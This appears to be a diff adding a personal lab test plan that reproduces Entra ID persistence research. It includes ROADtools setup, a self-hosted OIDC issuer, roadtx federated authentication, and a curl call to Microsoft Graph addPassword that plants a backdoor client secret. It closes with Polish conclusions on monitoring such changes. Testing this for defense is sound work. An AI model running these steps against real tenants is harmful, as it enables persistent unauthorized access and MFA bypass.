@@ -1,0 +1,63 @@
+https://dirkjanm.io/persisting-with-federated-credentials-entra-apps-managed-identities/
+6. Dirk-jan Mollema: Bringing Your Own Identity Provider to Entra for Persistence and MFA Bypasses
+
+Test Plan:
+Test case #1 
+Create Azure application 
+Configure federated credentials on the application
+Authenticate using federated credentials and roadtools + add tokens
+Edit federated credentials 
+Modify policy object over API using AD Graph 
+
+Test case #2
+Add federated credentials to service principal 
+Authenticate using federated credentials and roadtools  + add tokens
+Edit federated credentials 
+Modify policy object ofer API using AD Graph 
+
+	1. Create storage blob
+	2. Download roadtools 
+	3. Install
+	4. Configure 
+	5. Run flask and download files
+	6. Copy files to blob 
+
+git clone https://github.com/dirkjanm/ROADtools
+cd ROADtools/
+pipx install roadlib/
+pipx install roadtx/
+cd roadoidc
+
+Config:
+python3 genconfig.py -c testconfig.py -i https://diraug.blob.core.windows.net/entra
+mv testconfig.py flaskapp/app_config.py
+
+Flask: 
+Cd flaskapp/
+Flask run
+wget http://127.0.0.1:5000/.well-known/openid-configuration -O config.json
+wget http://127.0.0.1:5000/keys.json -O keys.json
+
+
+python3 genconfig.py -c testconfig.py -i https://xxx.azurewebsites.net
+
+Python3 -m venv ./roadtools
+Source ./roadtools/bin/activate
+pip install roadrecon
+pip install roadtx
+python3 genconfig.py -c testconfig.py -i https://xxx.blob.core.windows.net/entra/
+mv testconfig.py flaskapp/app_config.py
+
+roadtx federatedappauth -c xxx --cert-pem roadoidc.pem --key-pem roadoidc.key --subject testapp -t iminyour.cloud --issuer https://xxx.azurewebsites.net/ -s https://graph.microsoft.com/.default 
+
+curl -X POST https://graph.microsoft.com/v1.0/applications/xxxx/addPassword -H "Authorization: Bearer eyJ0…" -H "Content-Type: application/json" -d '{"passwordCredential": { "displayName": "MynewSecret", "endDateTime": "2026-09-21T00:00:00Z" } }'
+
+curl -X GET https://graph.microsoft.com/v1.0 -H "Authorization: Bearer eyJ0.."
+
+
+
+Wnioski: 
+
+Cloud security -> monitorowanie/blokowanie modyfikacji managed auth 
+SP -> Federated auth 
+
